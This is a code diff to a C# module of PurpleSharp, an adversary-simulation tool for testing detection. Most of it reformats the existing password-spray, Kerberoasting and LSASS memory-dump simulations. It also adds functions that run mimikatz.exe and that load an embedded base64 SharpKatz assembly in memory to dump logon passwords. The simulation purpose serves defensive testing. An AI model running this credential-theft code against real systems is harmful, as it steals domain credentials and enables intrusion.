@@ -2,8 +2,12 @@
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.IO;
 using System.Linq;
 using System.Net;
+using System.Net.Http;
+using System.Reflection;
+using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
@@ -13,10 +17,8 @@ namespace PurpleSharp.Simulations
 {
     public class CredAccess
     {
-
         public static void LocalDomainPasswordSpray(PlaybookTask playbookTask, string log)
         {
-
             string currentPath = AppDomain.CurrentDomain.BaseDirectory;
             Lib.Logger logger = new Logger(currentPath + log);
             logger.SimulationHeader("T1110.003");
@@ -24,9 +26,11 @@ namespace PurpleSharp.Simulations
             logger.TimestampInfo(String.Format("Using {0}", playbookTask.protocol));
             try
             {
-                List<User> usertargets = Targets.GetUserTargets(playbookTask, logger) ;
+                List<User> usertargets = Targets.GetUserTargets(playbookTask, logger);
 
-                if (playbookTask.task_sleep > 0) logger.TimestampInfo(String.Format("Sleeping {0} seconds between attempt", playbookTask.task_sleep));
+                if (playbookTask.task_sleep > 0)
+                    logger.TimestampInfo(String.Format("Sleeping {0} seconds between attempt",
+                        playbookTask.task_sleep));
                 String domain = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
                 //if (playbookTask.user_target_type == 6) domain = ".";
 
@@ -43,13 +47,13 @@ namespace PurpleSharp.Simulations
                         if (playbookTask.task_sleep > 0) Thread.Sleep(playbookTask.task_sleep * 1000);
                     }
                 }
+
                 logger.SimulationFinished();
             }
             catch (Exception ex)
             {
                 logger.SimulationFailed(ex);
             }
-
         }
 
         public static void RemoteDomainPasswordSpray(PlaybookTask playbookTask, string log)
@@ -57,7 +61,8 @@ namespace PurpleSharp.Simulations
             string currentPath = AppDomain.CurrentDomain.BaseDirectory;
             Logger logger = new Logger(currentPath + log);
             logger.SimulationHeader("T1110.003");
-            logger.TimestampInfo(String.Format("Remote Domain Brute Force using the WNetAddConnection2 Win32 API function"));
+            logger.TimestampInfo(
+                String.Format("Remote Domain Brute Force using the WNetAddConnection2 Win32 API function"));
             bool Kerberos = false;
             List<Computer> host_targets = new List<Computer>();
             List<User> user_targets = new List<User>();
@@ -73,27 +78,30 @@ namespace PurpleSharp.Simulations
                 host_targets = Targets.GetHostTargets(playbookTask, logger);
                 user_targets = Targets.GetUserTargets(playbookTask, logger);
                 //if (playbookTask.protocol.ToUpper().Equals("NTLM")) Kerberos = false;
-                if (playbookTask.task_sleep > 0) logger.TimestampInfo(String.Format("Sleeping {0} seconds between attempt", playbookTask.task_sleep));
+                if (playbookTask.task_sleep > 0)
+                    logger.TimestampInfo(String.Format("Sleeping {0} seconds between attempt",
+                        playbookTask.task_sleep));
 
                 if (playbookTask.host_target_type == 1 || playbookTask.host_target_type == 2)
                 {
                     //Remote spray against one target host
                     //Target host either explictly defined in the playbook or randomly picked using LDAP queries
                     foreach (User user in user_targets)
-                    { 
+                    {
                         User tempuser = user;
                         //int tempindex = index;
                         //if (playbookTask.task_sleep > 0 && tempindex > 0) Thread.Sleep(playbookTask.task_sleep * 1000);
-                        if (playbookTask.task_sleep > 0 ) Thread.Sleep(playbookTask.task_sleep * 1000);
+                        if (playbookTask.task_sleep > 0) Thread.Sleep(playbookTask.task_sleep * 1000);
                         tasklist.Add(Task.Factory.StartNew(() =>
                         {
-                            CredAccessHelper.RemoteSmbLogin(host_targets[0], domain, tempuser.UserName, playbookTask.sprayPassword, Kerberos, logger);
+                            CredAccessHelper.RemoteSmbLogin(host_targets[0], domain, tempuser.UserName,
+                                playbookTask.sprayPassword, Kerberos, logger);
                         }));
                     }
-                    Task.WaitAll(tasklist.ToArray());
 
+                    Task.WaitAll(tasklist.ToArray());
                 }
-                
+
                 else if (playbookTask.host_target_type == 3 || playbookTask.host_target_type == 4)
                 {
                     //Remote spray against several hosts, distributed
@@ -108,13 +116,14 @@ namespace PurpleSharp.Simulations
                         if (playbookTask.task_sleep > 0 && temp > 0) Thread.Sleep(playbookTask.task_sleep * 1000);
                         tasklist.Add(Task.Factory.StartNew(() =>
                         {
-                            CredAccessHelper.RemoteSmbLogin(host_targets[temp], domain, user_targets[temp].UserName, playbookTask.sprayPassword, Kerberos, logger);
-
+                            CredAccessHelper.RemoteSmbLogin(host_targets[temp], domain, user_targets[temp].UserName,
+                                playbookTask.sprayPassword, Kerberos, logger);
                         }));
                     }
+
                     Task.WaitAll(tasklist.ToArray());
                 }
-                
+
                 logger.SimulationFinished();
             }
             catch (Exception ex)
@@ -122,7 +131,7 @@ namespace PurpleSharp.Simulations
                 logger.SimulationFailed(ex);
             }
         }
-        
+
         public static void Kerberoasting(PlaybookTask playbookTask, string log)
         {
             string currentPath = AppDomain.CurrentDomain.BaseDirectory;
@@ -130,7 +139,9 @@ namespace PurpleSharp.Simulations
             logger.SimulationHeader("T1558.003");
             List<String> servicePrincipalNames;
 
-            if (playbookTask.task_sleep > 0) logger.TimestampInfo(String.Format("Sleeping {0} seconds between each service ticket request", playbookTask.task_sleep));
+            if (playbookTask.task_sleep > 0)
+                logger.TimestampInfo(String.Format("Sleeping {0} seconds between each service ticket request",
+                    playbookTask.task_sleep));
 
             try
             {
@@ -141,64 +152,106 @@ namespace PurpleSharp.Simulations
 
                 if (playbookTask.variation == 1)
                 {
-                    logger.TimestampInfo(String.Format("Requesting a service ticket for all the {0} identified SPNs", servicePrincipalNames.Count));
+                    logger.TimestampInfo(String.Format("Requesting a service ticket for all the {0} identified SPNs",
+                        servicePrincipalNames.Count));
                     foreach (String spn in servicePrincipalNames)
                     {
                         SharpRoast.GetDomainSPNTicket(spn.Split('#')[0], spn.Split('#')[1], "", "", logger);
                         if (playbookTask.task_sleep > 0) Thread.Sleep(playbookTask.task_sleep * 1000);
                     }
-                    logger.SimulationFinished();
 
+                    logger.SimulationFinished();
                 }
                 else if (playbookTask.variation == 2)
                 {
                     var random = new Random();
-                    logger.TimestampInfo(String.Format("Requesting a service ticket for {0} random SPNs", playbookTask.user_target_total));
+                    logger.TimestampInfo(String.Format("Requesting a service ticket for {0} random SPNs",
+                        playbookTask.user_target_total));
 
-                    for (int i = 0; i< playbookTask.user_target_total;i++)
+                    for (int i = 0; i < playbookTask.user_target_total; i++)
                     {
                         int index = random.Next(servicePrincipalNames.Count);
-                        SharpRoast.GetDomainSPNTicket(servicePrincipalNames[index].Split('#')[0], servicePrincipalNames[index].Split('#')[1], "", "", logger);
+                        SharpRoast.GetDomainSPNTicket(servicePrincipalNames[index].Split('#')[0],
+                            servicePrincipalNames[index].Split('#')[1], "", "", logger);
                         if (playbookTask.task_sleep > 0) Thread.Sleep(playbookTask.task_sleep * 1000);
                     }
+
                     logger.SimulationFinished();
                 }
                 else if (playbookTask.variation == 3)
                 {
                     var random = new Random();
-                    logger.TimestampInfo(String.Format("Requesting a service ticket for {0} defined SPNs", playbookTask.user_targets.Length));
+                    logger.TimestampInfo(String.Format("Requesting a service ticket for {0} defined SPNs",
+                        playbookTask.user_targets.Length));
 
-                    foreach ( string spn in playbookTask.user_targets)
+                    foreach (string spn in playbookTask.user_targets)
                     {
                         SharpRoast.GetDomainSPNTicket(spn.Split('#')[0], spn.Split('#')[1], "", "", logger);
                         if (playbookTask.task_sleep > 0) Thread.Sleep(playbookTask.task_sleep * 1000);
                     }
+
                     logger.SimulationFinished();
                 }
-
             }
             catch (Exception ex)
             {
                 logger.SimulationFailed(ex);
             }
-
         }
+
         public static void LsassMemoryDump(PlaybookTask playbookTask, string log)
         {
             string currentPath = AppDomain.CurrentDomain.BaseDirectory;
             Lib.Logger logger = new Lib.Logger(currentPath + log);
-            logger.SimulationHeader("T1003.001");
+            logger.SimulationHeader("T1003.001-SharpDump");
             try
             {
                 CredAccessHelper.LsassMemoryDump(playbookTask.cleanup, logger);
                 logger.SimulationFinished();
             }
-            catch(Exception ex)
+            catch (Exception ex)
             {
                 logger.SimulationFailed(ex);
             }
         }
 
+        public static void RunMimikatz(PlaybookTask playbookTask, string log)
+        {
+            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
+            Lib.Logger logger = new Lib.Logger(currentPath + log);
+            logger.SimulationHeader("T1003.001-运行本地mimikatz.exe");
+            // 指定要执行的exe文件路径
+            if (playbookTask.filePath == null)
+            {
+                playbookTask.filePath = @"C:\Windows\Temp\Files\mimikatz.exe";
+            }
+            try
+            {
+
+                ExecutionHelper.StartProcessNET(playbookTask.filePath, @"sekurlsa::logonpasswords", logger);
+            }
+            catch (Exception ex)
+            {
+                logger.SimulationFailed(ex);
+            }
+        }
+
+        public static void ExecuteAssemblyMimikatz(string log)
+        {
+            string currentPath = AppDomain.CurrentDomain.BaseDirectory;
+            Lib.Logger logger = new Lib.Logger(currentPath + log);
+            logger.SimulationHeader("T1003.001-运行内置sharpkatz");
+            try
+            {
+                Byte[] fileBytes = Convert.FromBase64String(Static.sharpkatz);
+                string[] args = { "--Command sekurlsa::logonpasswords" };
+                logger.TimestampInfo("Executing SharpKatz Command: " + string.Join(" ", args));
+                CredAccessHelper.ExecuteAssemblyLoad(fileBytes, args);
+            }
+            catch (Exception ex)
+            {
+                logger.SimulationFailed(ex);
+            }
+        }
     }
 }
-
